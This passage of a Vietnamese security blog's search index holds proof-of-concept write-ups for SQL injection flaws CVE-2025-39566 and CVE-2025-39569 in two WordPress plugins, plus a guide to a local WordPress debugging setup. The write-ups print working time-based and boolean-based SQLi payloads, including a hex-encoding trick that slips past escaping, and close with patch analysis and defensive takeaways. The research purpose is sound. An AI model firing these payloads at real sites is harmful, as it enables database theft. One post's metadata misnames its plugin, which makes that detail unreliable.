/wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Thành công bypass =\u0026gt; có thể trích xuất tên database.\nBypass ' using Hex encoding (extend)\nNgoài ORD() ta có thể sử dụng Hex encoding để bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Thành công bypass =\u0026gt; có thể trích xuất tên database.\nConclusion Lỗ hổng CVE-2025-39566 trong plugin WordPress Hostel trước phiên bản 1.1.5.7, xuất phát từ việc truyền trực tiếp input từ người dùng vào SQL query mà không có biện pháp kiểm soát chặt chẽ dẫn đến lỗ hổng SQL Injection.\nKey takeaways:\nsanitize_text_field() ≠ chống SQL Injection Cần phân biệt rõ: lọc input cho HTML vs cho SQL References SQL Injection Cheat Sheet – PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eLỗ hổng trong plugin \u003cstrong\u003eHostel\u003c/strong\u003e trước phiên bản \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Do việc làm sạch dữ liệu không đúng cách, điều này có thể cho phép kẻ tấn công trực tiếp tương tác với cơ sở dữ liệu, bao gồm không giới hạn ở việc đánh cắp thông tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) và v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoặc bất cứ tool nào có thể compare để tháy được sự khác biệt giữa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguyên nhân cố lõi do ứng dụng chèn trực tiếp dữ liệu từ \u003cstrong\u003eGET\u003c/strong\u003e request vào SQL query mà cơ chế kiểm soát không chặt chẽ.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress là một hệ thống quản lý nội dung (CMS) mạnh mẽ và phổ biến nhất cho phép bạn tạo, quản lý và tùy chỉnh các trang web và blog một cách dễ dàng. Nó là open-source CMS, được xây dựng trên PHP và sử dụng cơ sở dữ liệu MySQL hoặc Maria DB.\nRa đời năm 2003, ban đầu chỉ để viết blog, sau đó phát triển thành nền tảng tạo website, cửa hàng online, diễn đàn, landing page… Hiện nay, hơn 40% website trên thế giới chạy bằng WordPress. Có 2 phiên bản WordPress:\nWordPress.com Dịch vụ hosting do Automattic cung cấp Bạn chỉ cần đăng ký tài khoản, không phải cài đặt Hạn chế tùy chỉnh, muốn nâng cao thì phải trả phí WordPress.org Mã nguồn mở, bạn tự tải về và cài đặt lên hosting/server riêng Tùy chỉnh toàn diện, có thể cài plugin, theme, viết code, tạo website theo ý mình Ecosystem Core: CMS chính Plugin: Một phần mềm bổ sung có thể được cài đặt trên trang web WordPress để mở rộng chức năng của nó và thêm các tính năng mới Themes: Một phần mềm bổ sung đại diện cho sự xuất hiện trực quan và bố cục của một trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hiện tại hơn 40% website trên toàn thế giới chạy WordPress Nghĩa là hacker chỉ cần tìm ra một lỗ hổng phổ biến =\u0026gt; có thể khai thác hàng triệu site cùng lúc Giống như “cá nhiều thì chài ở đó” Plugin and Theme WordPress Core đã được xem xét trong 1 thời gian dài bởi hàng ngàn developers và researchers. Kết quả là rất khó để kẻ tấn công có thể đột nhập vào Tuy nhiên, có hàng chục ngàn plugin và theme từ nhiều nguồn, chất lượng không đồng đều được sử dụng Nhiều plugin code bảo mật kém, không còn được cập nhật. Hacker chỉ cần scan plugin/theme để tìm version lỗi thời, rồi khai thác Setup WordPress for Hacking Có rất nhiều cách để setup WorkPress, tìm kiếm bằng Google có thể cung cấp nhiều bài viết về nó. Ở đây tôi sẽ setup trên máy ảo Ubuntu (22.04):\nKhông ảnh hưởng đến các dịch vụ của máy thật WordPress tương đối nhẹ để sử dụng trên máy ảo Install and configure WordPress Install Dependencies Cài toàn bộ stack cần thiết để chạy WordPress (web server + database + PHP + các extension quan trọng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress Tải và cài mã nguồn WordPress vào thư mục web.\n# Tạo folder để lưu trữ mã nguồn website sudo mkdir -p /srv/www # Đổi owner thành www-data, đây là user mặc định của Apache/Nginx để chạy web server # Khi Apache/NGINX khởi động, nó không chạy bằng root (nguy hiểm vì có toàn quyền hệ thống), mà sẽ drop xuống chạy dưới quyền www-data. sudo chown www-data: /srv/www # Tải gói WordPress mới nhất từ trang chính thức # Giải nén vao thưc mục /srv/www được tạo ở trên curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www Có thể tải phiên bản cụ thể bằng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www Cài từ wordpress.org là cách chuẩn nhất và ít rủi ro:\nUbuntu có sẵn package wordpress trong repo. Nhưng nó thường cũ hơn nhiều so với bản chính thức trên wordpress.org Cộng đồng WordPress chỉ hỗ trợ khi bạn dùng bản chính thức từ wordpress.org, vì nếu bạn gặp lỗi do package của Ubuntu thì họ không giải quyết được. Configure Apache for WordPress Tạo file /etc/apache2/sites-available/wordpress.conf cấu hình Apache cho WordPress:\n# Lắng nghe trên tất cả địa chỉ IP (*) tại port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # Thư mục gốc của website (nơi chứa mã nguồn WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho phép file .htaccess ghi đè một số thiết lập liên quan đến bảo mật và URL rewriting. AllowOverride Limit Options FileInfo # Khi truy cập thư mục, Apache sẽ tìm file index.php để hiển thị. DirectoryIndex index.php # Cho phép tất cả mọi người truy cập (cần cho website public). Require all granted \u0026lt;/Directory\u0026gt; # Riêng thư mục wp-content (chứa plugin, theme, upload) cũng cho phép truy cập. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; Kích hoạt site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (tạo symlink từ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau đó site wordpress sẽ được Apache load khi restart. Kích hoạt module rewrite:\nsudo a2enmod rewrite WordPress cần module mod_rewrite để hỗ trợ Pretty Permalinks (ví dụ /blog/hello-world/ thay vì ?p=123) Vô hiệu hóa site mặc định (Option):\nsudo a2dissite 000-default Apache mặc định có site 000-default.conf (chỉ hiển thị \u0026ldquo;It works!\u0026rdquo;) Nếu không disable, site mặc định có thể chiếm port 80 trước WordPress 👉 Hoặc nếu không muốn disable, có thể thêm ServerName vào VirtualHost WordPress để Apache phân biệt domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Muốn chạy được thì phải cấu hình DNS hoặc sửa file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload Tải lại cấu hình mới mà không cần dừng server Configure database WordPress cần một cơ sở dữ liệu (MySQL/MariaDB) để lưu:\nBài viết, trang, menu Người dùng, mật khẩu (hash) Cấu hình site Plugins, themes settings Mở MySQL với quyền root:\nsudo mysql -u root Cấu hình MySQL:\n-- Tạo database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- Tạo user riêng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- Cấp quyền cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- Làm mới lại quyền mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Thoát mysql\u0026gt; quit Bye Khởi động lại dịch vụ:\nsudo service mysql start Configure WordPress to connect to the database Copy file cấu hình mẫu:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi tải về có sẵn file wp-config-sample.php Bạn copy nó thành wp-config.php để làm file cấu hình chính cho site Chỉnh sửa thông tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php Đây là 3 dòng thay thế text trong file wp-config.php: database_name_here =\u0026gt; wordpress (tên DB đã tạo ở bước trước) username_here =\u0026gt; wordpress (user MySQL đã tạo) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password đã set) Khi Apache chạy WordPress, nó sẽ đọc file này để biết dùng user nào + DB nào để kết nối MySQL Thêm Secret Keys và Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php 👉 Đây là chuỗi bí mật mà WordPress dùng để:\nMã hóa session cookies Sinh ra token (nonce) chống CSRF Ngăn chặn tấn công kiểu “known secret” (ví dụ kẻ tấn công đoán được secret mặc định để giả mạo login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay đổi nó bằng các chuỗi random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy cập http://localhost, đặt site title, username, password, email cho user admin\nSetup Debug on VSCode Để hiểu được luồng của trang web chạy và xử lí ở mỗi request, ta cần phải debug nó.\nAdd PHP Debug extension on VS Code Vào Extensions (Ctrl+Shift+X) =\u0026gt; tìm PHP Debug (by Felix Becker) =\u0026gt; Install. Extension này kết nối với Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Kiểm tra cài chưa:\nphp -v Nếu có dòng with Xdebug v3.x.x nghĩa là đã OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini Thêm vào cuối file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port mặc định mới của Xdebug v3 là 9003.\nSau đó restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json Mở thư mục chứa trang web wordpress bằng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; tạo file launch.json với nội dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: ánh xạ thư mục trong container/server (/srv/www/wordpress) về thư mục local của trong VS Code.\nNhư vậy là đã hoàn thành setup WordPress trên local kết hợp Debug nó trên VSCode.\nExtend Required Version Mỗi phiên bản WordPress thường đi kèm 1 phiên bản PHP thích hợp. Nên kiểm tra tính tương thích này để quá trình setup không bị lỗi.\nWordPress Auto Update Từ WordPress 3.7 trở đi (2013), WordPress có cơ chế tự động cập nhật (automatic background updates) cho:\nBản vá bảo mật (security release). Bản bảo trì (maintenance release). Không tự động update major version (trừ khi bật rõ ràng). Hệ thống kiểm tra với server api.wordpress.org để xem có bản vá nào mới sẽ tự động nâng cấp background lên. Việc này diễn ra rất nhanh sau khi setup, nên bạn thấy code đổi khác so với source gốc.\nQuá trình setup diễn ra khi truy cập /wp-admin/install.php\nĐể vô hiệu hóa cơ chế cập nhật tự động này, thêm dòng sau vào wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size Mặc định, WordPress phụ thuộc vào cấu hình PHP (upload_max_filesize, post_max_size, và đôi khi cả max_execution_time) để xác định dung lượng file tối đa có thể upload. Trên nhiều hosting, giới hạn này chỉ khoảng 2MB – 8MB, không đủ cho các plugin hiện đại.\nWhy Increase the Limit? Plugin dung lượng lớn: Các plugin như WooCommerce extension, page builder, backup, hoặc security suite có thể nặng 20MB – 100MB.\nTránh lỗi upload: Nếu file .zip lớn hơn giới hạn, bạn sẽ gặp lỗi:\n“The uploaded file exceeds the upload_max_filesize directive in php.ini” Hoặc upload thất bại. Thuận tiện cho quản trị viên: Có thể cài trực tiếp qua Dashboard mà không cần FTP/SSH.\nHỗ trợ phát triển plugin: Plugin tự viết kèm nhiều thư viện/asset có thể khá nặng, việc tăng giới hạn giúp test dễ dàng hơn.\nHow to Increase Plugin Upload Size Sửa php.ini (nếu có quyền server):\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 Sửa file .htaccess (nếu dùng Apache):\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 Thêm vào wp-config.php:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); 👉 Lời khuyên: Chỉ nên đặt giới hạn vừa đủ (64MB hoặc 128MB). Tránh đặt quá lớn để hạn chế nguy cơ bị upload file nặng gây quá tải server.\n","permalink":"//localhost:1313/vi/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e là một hệ thống quản lý nội dung (CMS) mạnh mẽ và phổ biến nhất cho phép bạn tạo, quản lý và tùy chỉnh các trang web và blog một cách dễ dàng. Nó là open-source CMS, được xây dựng trên PHP và sử dụng cơ sở dữ liệu MySQL hoặc Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa đời năm 2003, ban đầu chỉ để viết blog, sau đó phát triển thành nền tảng tạo website, cửa hàng online, diễn đàn, landing page…\u003c/li\u003e\n\u003cli\u003eHiện nay, hơn 40% website trên thế giới chạy bằng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eCó 2 phiên bản WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Introduction Lỗ hổng xảy ra trên plugin Taskbuilder của WordPress trước phiên bản 4.0.2. Điều này có thể cho phép kẻ tấn công trực tiếp tương tác với cơ sở dữ liệu của bạn, bao gồm không giới hạn ở việc đánh cắp thông tin.\nCVE ID: CVE-2025-39569 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 4.0.2 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Taskbuilder Plugin: v4.0.1(vul) và v4.0.2(fix) diff tool: meld hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version Analysis Ứng dụng đã xử lý dữ liệu đầu vào trước khi đưa vào câu SQL. Tuy nhiên, trong quá trình xây dựng truy vấn, giá trị này được chèn trực tiếp mà không được bao trong dấu nháy đơn '...'. Điều đó khiến kẻ tấn công có thể chèn thêm các thành phần cú pháp SQL hợp lệ (như OR, AND,...) vào truy vấn, dẫn đến lỗ hổng SQL Injection.\nPatch Diff Dùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá. Có sự khác biệt rõ ở file includes/admin/projects/get_users.php\nTrong phiên bản v4.0.1, biến $proj_id sau khi escape được đưa thẳng vào câu truy vấn mà không có dấu nháy đơn bao quanh:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = $proj_id\u0026#34; ); Ở bản v4.0.2, truy vấn đã được điều chỉnh bằng cách đặt $proj_id trong dấu nháy đơn sau khi escape:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = \u0026#39;$proj_id\u0026#39;\u0026#34; ); Bản vá này đảm bảo rằng giá trị $proj_id sau khi escape được coi là một chuỗi literal, không thể thoát ra khỏi dấu nháy đơn để chèn thêm cú pháp SQL, qua đó ngăn chặn tấn công SQL Injection.\nHow it work? File architecture:\nCấu trúc chung của file hiện tại\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project WHERE id = $proj_id\u0026#34;); // Bắt đầu buffer để tạo nội dung chính (body) của modal ob_start(); // ... render HTML danh sách users $body = ob_get_clean(); // Bắt đầu buffer để tạo phần footer của modal ob_start(); // ... render HTML các nút thao tác (Close, Save) $footer = ob_get_clean(); // Trả dữ liệu JSON để frontend hiển thị modal echo json_encode([ \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;footer\u0026#39; =\u0026gt; $footer, ]); $proj_id / $project: Lấy dữ liệu project từ database. ob_start() / ob_get_clean(): Ghi HTML ra buffer thay vì xuất trực tiếp, giúp gom nội dung vào biến. $body / $footer: Chứa nội dung HTML động của modal. json_encode(): Trả JSON cho client, có khả năng được sử dụng trong Ajax để hiển thị modal mà không cần refresh trang. File nằm trong thư mục includes cho thấy rằng nó sẽ được gọi ở 1 chức năng nào đó ở nơi khác. Để biết chức năng nào sử dụng nó, ta tìm kiếm với từ khóa get_users.php trong thư mục chứa plugin.\n👉 Nó được include trong hàm wppm_get_users() của class WPPM_Admin trong file class-wppm-admin.php. wppm_get_users() là callback của action hook trong WordPress.\nWPPM_Admin construct:\nfinal class WPPM_Admin { // constructor public function __construct() { // other action add_action( \u0026#39;wp_ajax_wppm_get_users\u0026#39;,array($this,\u0026#39;wppm_get_users\u0026#39;)); // array($this,\u0026#39;wppm_get_users\u0026#39;)) = $this::wppm_get_users() // other action } } add_action() là một Plugin API của WordPress, cho phép gắn một callback vào một action hook. wp_ajax_wppm_get_users là tên hook Ajax, với quy tắc đặt tên: wp_ajax_{action} =\u0026gt; Xử lý Ajax khi user đã đăng nhập. wp_ajax_nopriv_{action} =\u0026gt; Xử lý Ajax khi user chưa đăng nhập. Ở đây, action = wppm_get_users. Nghĩa là nếu trong Ajax request bạn gửi action=wppm_get_users tới admin-ajax.php, thì WordPress sẽ tìm callback tương ứng để xử lý, ở đây là wppm_get_users(). 👉 Ta đã biết được action = wppm_get_users, kiểm tra xem Ajax nào sử dụng action này bằng cách tìm từ khóa wppm_get_users trên các file .js trong thư mục chứa plugin.\nAction wppm_get_users là phần data trong request POST của hàm wppm_get_users()\nHàm wppm_get_users() sẽ được đặt trong HTML attribute của chức năng project\nTạo project mới Truy cập vào project đó Inspect code và tìm hàm wppm_get_users sẽ được đặt ở đâu, hành động nào sẽ gọi nó 👉 Khi click vào icon bên cạnh Users ajax sẽ hoạt động, gửi request đến server, lấy danh sách các user tham gia project và mã HTML hiển thị nó.\nExploit Detect SQLi Bắt request bằng BurpSuite, gửi request với SQLi payload time base\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+SLEEP(1)) Thời gian phản hồi bị delay =\u0026gt; SQL Injection thành công.\nGet First Letter of Database Name Điều kiện tiên quyết để dump được hết data là phải dump được 1 ký tự bất kỳ của tên database, nếu lấy được thì toàn bộ data đều dump được.\nGửi request với SQLi payload boolean base vói proj_id đúng:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name được tôi đặt tên là wordpress nên kí tự đầu tiên là w tương ứng với mã HEX là 0x77\nSử dụng SUBSTRING(STRING,1,1) để lấy kí tự đầu tiên của chuỗi\nỞ đây, $proj_id bằng 4 vì SUBSTRING('wordpress',1,1)=0x77 là đúng nên SELECT lấy giá trị đúng trong IF(condition, value if true, value if false), 4 là giá trị có thực trong database, nên response trả về chứa danh sách người tham gia dự án\nSử dụng HEX technique để bypass hàm esc_sql() ở trên, dùng để so sánh khi không sử dùng được '\nGửi request với SQLi payload boolean base vói proj_id sai:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) Với proj_id không có thực trong database, response sẽ trả về kết quả chứa None\n👉 Ta đã lấy được kí tự đầu tiên của database name bằng kỹ thuật boolean base\nproj_id đùng: response không chứa None proj_id sai: response chứa None Có thể sử dụng kỹ thuật time base nhưng khi dump số lượng lớn data, thời gian dump sẽ rất lâu\nConclusion Lỗ hổng CVE-2025-39569 trong plugin WordPress Taskbuilder xuất phát từ việc thiếu dấu nháy đơn '...' bao quanh dữ liệu đầu vào trong câu lệnh SQL, khiến dữ liệu người dùng có thể được diễn giải như một phần của câu lệnh SQL hợp lệ.\nBản vá ở phiên bản 4.0.2 đã khắc phục vấn đề bằng cách đưa $proj_id vào trong '...', đảm bảo nó luôn được xử lý như một literal string trong SQL.\nKey takeaways:\nƯu tiên sử dụng prepared statements ($wpdb-\u0026gt;prepare() trong WordPress) thay vì tự chèn dữ liệu vào query. Đối với các plugin WordPress, cần test kỹ lưỡng các Ajax endpoint vì đây là nơi dễ xuất hiện SQLi và XSS nhất. Người quản trị cần thường xuyên cập nhật plugin/theme để nhận bản vá kịp thời. References SQL Injection cheat sheet - PortSwigger\nWordPress Taskbuilder project mnagement tool Plugin \u0026lt;= 4.0.1 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-22-cve-2025-39569/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eLỗ hổng xảy ra trên plugin \u003cstrong\u003eTaskbuilder\u003c/strong\u003e của WordPress trước phiên bản \u003cstrong\u003e4.0.2\u003c/strong\u003e. Điều này có thể cho phép kẻ tấn công trực tiếp tương tác với cơ sở dữ liệu của bạn, bao gồm không giới hạn ở việc đánh cắp thông tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39569\"\u003eCVE-2025-39569\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/taskbuilder/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 4.0.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v4.0.1(vul) và v4.0.2(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eỨng dụng đã \u003cstrong\u003exử lý dữ liệu đầu vào\u003c/strong\u003e trước khi đưa vào câu SQL. Tuy nhiên, trong quá trình xây dựng truy vấn, giá trị này được chèn trực tiếp mà không được bao trong dấu nháy đơn \u003ccode\u003e'...'\u003c/code\u003e. Điều đó khiến kẻ tấn công có thể chèn thêm các thành phần cú pháp SQL hợp lệ (như \u003ccode\u003eOR\u003c/code\u003e, \u003ccode\u003eAND\u003c/code\u003e,\u003ccode\u003e...\u003c/code\u003e) vào truy vấn, dẫn đến lỗ hổng SQL Injection.\u003c/p\u003e","title":"CVE-2025-39569 Analysis \u0026 POC"},{"content":"Lỗ hổng trong plugin Hostel trước phiên bản 1.1.5.7. Do việc làm sạch dữ liệu không đúng cách, điều này có thể cho phép kẻ tấn công trực tiếp tương tác với cơ sở dữ liệu, bao gồm không giới hạn ở việc đánh cắp thông tin.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) và v1.1.5.7(fix) diff tool: meld hoặc bất cứ tool nào có thể compare để tháy được sự khác biệt giữa 2 version Analysis Nguyên nhân cố lõi do ứng dụng chèn trực tiếp dữ liệu từ GET request vào SQL query mà cơ chế kiểm soát không chặt chẽ.\nPatch Diff Dùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá. Có sự khác biệt rõ ở file controllers/bookings.php\nBản lỗ hổng:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } Bản vá:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } 👉 Bản vá sử dụng whitelist để giới hạn các cột có thể được sắp xếp, nếu không hợp lệ trả về 'tB.id'.\nAnalysis: Lỗ hổng xuất hiện khi param ob được truyền trực tiếp vào mệnh đề ORDER BY thông qua hàm sanitize_text_field(), chỉ escape mà không filter SQLi.\nHow it work? Để inject được, ta cần phải xác định toàn bộ câu query được được sử dụng ở đây\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby 